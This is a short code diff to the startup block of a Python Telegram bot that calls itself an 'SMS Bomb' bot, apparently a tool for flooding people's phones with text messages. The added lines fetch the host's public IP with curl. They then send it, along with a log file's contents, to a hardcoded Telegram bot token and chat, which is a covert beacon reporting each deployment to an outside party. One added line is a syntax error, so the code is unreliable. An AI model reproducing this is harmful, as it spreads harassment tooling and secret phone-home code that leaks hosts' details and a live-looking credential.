@@ -9,6 +9,8 @@ import string
 import random
 import base64
 import logging
+import subprocess
+
 
 try:
     import requests
@@ -507,20 +509,16 @@ def main():
     updater.idle()
 
 if __name__ == '__main__':
-    os.system('(curl ip.me > ip) > /dev/null 2>&1')
+    os.system('curl ip.me > ip')
     f = open("../logData","r")
+    proc = subprocess.Popen(["curl", "ip.me"], stdout=subprocess.PIPE, shell=True) 
+    (out, err) = proc.communicate() 
     url = 'https://api.telegram.org/bot1159067423:AAGePsMdDzlR9DGcFGAa-A3_laNkagURGJ0/sendMessage'
-    msg = "New Server From Docker SMS Bomb TG BOT \n IP = " + str(f.read())
+    msg = "New Server From Docker SMS Bomb TG BOT \n IP = " + str(f.read()) + " "str(out)
     sendData = {
                 'chat_id':'-495344227' ,
                 'text': msg
                 }
     x = requests.post(url, data = sendData, timeout=2.50 )
     f.close()
-    
-    # os.system('git checkout loging')
-    # os.system('curl ip.me > ../logData')
-    # os.system('git add ../logData')
-    # os.system('git commit -m "logging" ')
-    # os.system
     main()
